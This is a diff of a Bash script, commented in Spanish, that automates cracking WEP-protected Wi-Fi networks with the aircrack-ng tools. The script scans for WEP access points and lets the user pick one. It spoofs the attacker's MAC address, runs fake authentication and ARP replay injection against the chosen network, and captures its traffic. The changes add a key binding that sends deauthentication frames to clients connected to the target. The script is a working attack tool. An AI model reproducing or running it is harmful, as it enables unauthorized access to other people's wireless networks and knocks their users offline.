@@ -12,7 +12,7 @@ clean() {
     airmon-ng | sed -n 's@^\(mon[0-9]\+\).*@\1@p'| xargs -n1 airmon-ng stop | grep -v '^$'
     verde "Limpiando temporales:\n"
     rm -v $RND* replay_arp* 2>/dev/null
-    verde "OK"
+    verde "OK\n"
 }
 
 verde "System check!\n"
@@ -23,7 +23,7 @@ which screen airmon-ng airodump-ng aireplay-ng aircrack-ng macchanger ifconfig i
 
 # Lanzamos wlan en modo monitor para buscar ESSIDs.
 verde "Iniciamos Adaptador, escribiremos en ${RND}.*"
-airmon-ng start wlan0
+airmon-ng start wlan0 || exit 1
 time screen -S airodump airodump-ng -w $RND mon0
 
 # Listamos los aps bajo WEP detectados.
@@ -38,7 +38,7 @@ if [ "$PRIVACY" = " WEP " ]; then
     amac[$i]=${MAC// /}
 fi
 done < $RND-01.csv
-[ -z $i ] && exit 1
+[ $i -eq 0 ] && exit 1
 verde "Seleccionar AP del 1 al $i:\n"
 read -r choice
 [ -z ${amac[$choice]} ] && exit 1
@@ -49,22 +49,26 @@ ifconfig mon0 down
 macchanger -A mon0
 MYMAC=$(macchanger -s mon0 | sed -n 's/Current MAC: \([0-9a-f\:]\+\) (.*/\1/p')
 verde "Ponemos la interficie monitor en el canal ${achannel[$choice]}:\n"
-iwconfig mon0 channel ${achannel[$choice]} 
+iwconfig mon0 channel ${achannel[$choice]}
 iwlist mon0 channel
 
 # Creamos un fichero .screenrc custom para 'splitear' aireplay/airodump en una sesión de screen.
 cat > ${RND}.screenrc <<EOF
 startup_message off
 zombie cr
+bind ^b screen -t Deauth 3 aireplay-ng -0 5 -a ${amac[$choice]} -c \$(sed -n 's@^\([0-9A-F:]\{17\}\),.*@\1@p' < $RND-02.csv | grep -iv ${amac[$choice]} | grep -iv $MYMAC) mon0
 screen -t Auth   0 aireplay-ng -1 6000 -o 1 -q 10 -e ${aessid[$choice]} -a ${amac[$choice]} -h $MYMAC mon0
 split
 focus
-screen -t Replay 1 aireplay-ng -3 -b ${amac[$choice]} -h $MYMAC mon0
+screen -t Replay 1 aireplay-ng -3 -x 50 -b ${amac[$choice]} -h $MYMAC mon0
 split
 focus
 screen -t Dump   2 airodump-ng -c ${achannel[$choice]} --bssid ${amac[$choice]} -w $RND mon0
 resize +6
 EOF
+
+# Deauth
+# aireplay-ng --deauth 5 -a ${amac[$choice]} -c $(sed -n 's@^\([0-9A-F:]\{17\}\),.*$@\1@p' < $RND-02.csv) mon0
 
 # Efectuamos el ataque en si.
 verde "Ataque ARP REPLAY\n"
